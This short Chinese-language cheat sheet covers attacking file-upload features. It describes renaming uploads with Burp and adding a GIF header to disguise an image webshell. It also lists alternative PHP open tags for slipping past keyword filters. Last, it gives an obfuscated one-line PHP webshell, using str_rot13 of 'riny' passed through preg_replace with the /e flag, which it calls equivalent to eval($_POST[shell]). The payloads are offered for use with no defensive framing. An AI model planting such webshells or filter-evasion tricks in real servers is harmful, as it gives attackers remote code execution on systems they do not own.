# Upload

* ### 上传图片马

burp抓包更改后缀（php，html，js，aspx）

注意文件头：

```
GIF98a //GIF文件头
```

* #### 关键字屏蔽绕过：

```
<?php=
```

```
<?php

?>
```

```
<script language="php"></script>
```

上面的三句话等价

屏蔽eval、assert等木马关键字时，通过加密解密进行绕过

```
<?php 
$exp = $_POST['shell'];
@preg_replace('/ad/e','@'.str_rot13('riny').'($exp)', 'add');
?>    //等同于php一句话<?php eval($_POST[shell]);?>
```



